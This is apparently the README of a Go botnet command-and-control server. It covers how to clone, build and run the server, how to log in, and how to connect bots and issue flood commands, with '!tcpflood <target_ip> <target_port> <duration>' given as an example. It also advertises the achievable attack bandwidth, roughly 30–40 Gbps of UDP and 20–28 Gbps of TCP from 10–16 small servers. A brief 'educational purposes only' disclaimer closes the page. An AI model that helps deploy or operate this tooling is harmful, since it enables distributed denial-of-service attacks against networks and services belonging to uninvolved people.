# Botnet Control and Command (CnC) Server

## Overview
This project implements a simple Botnet Control and Command (CnC) server in Go, enabling users to manage connected bots and execute various network attack commands.

## Features
- **User Authentication**: Secure login and credential management.
- **Bot Management**: Connect and manage multiple bots.
- **Attack Execution**: Send commands to bots for executing different types of network attacks.
- **Logging**: Track bot connections and actions.

## Prerequisites
- Go 1.18 or higher
- Terminal/command line interface
- Basic understanding of Go and network programming

## Installation
1. **Clone the repository**:
   ```bash
   git clone https://github.com/Birdo1221/BotnetGo.git
   cd BotnetGo
   ```

2. **Install dependencies**:
   ```bash
   go mod tidy
   ```
   If you are experiencing errors / issues or just 
   want to reinstall to redo the Mod files just do:
   
   ```bash
   go mod init cnc
   go mod tidy
   ```

4. **Build the project**:
   ```bash
   go build -o botnet
   ```

5. **Run the server**:
   ```bash
   ./botnet
   ```

## Configuration
Edit the constants in `main.go` to configure:
- **User and Bot Server IPs**: Adjust `USER_SERVER_IP` and `BOT_SERVER_IP`.
- **Server Ports**: Modify `USER_SERVER_PORT` and `BOT_SERVER_PORT`.

## Usage
- Start the server and connect your bots.
- Use the CLI to log in and execute commands.
  ### e.g. Termum, Mobaxterm or Putty
- Example command to start an attack:
  ```bash
  !tcpflood <target_ip> <target_port> <duration>
  ```

  ## Logging in 
1. **How to Login**:
   On Line 290 there is a string that is prompted to be called for before being able to login to it
   e.g. loginforme


2. **Users **:

   After that, you will be prompted to enter a username and password. If you don't remember them, you can check the users.json file, which contains the login information and more.  

3.  **Future Development/ Power problem **:
   When searching for a reliable network source, one of the most significant concerns is the power it can deliver. Many users face challenges when a single source does not meet their expectations, they often switch to a differnt source or just abandon their search altogether.

This source is designed to provide expected performance. To start fully utilizing this source you will need around 10 to 16 servers, each equipped with 1 core and 1 GB of RAM, and an output capacity of 1 Gbps, you can achieve approximately 30 to 40 Gbps for UDP traffic.

Performance may vary based on several factors, including:

*.Packet size
*.Server output
*.RTT based on geolocation
For TCP methods, similar performance can be expected for each methods, typically ranging from 20 to 28 Gbps, though this is also influenced by various conditions.
   
## Disclaimer

#  ```This project is for educational purposes only. Ensure you have permission before testing any network security tools on remote servers. I bear no responsibility or obligation to anyone using this for malicious purposes. ```

## License
This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
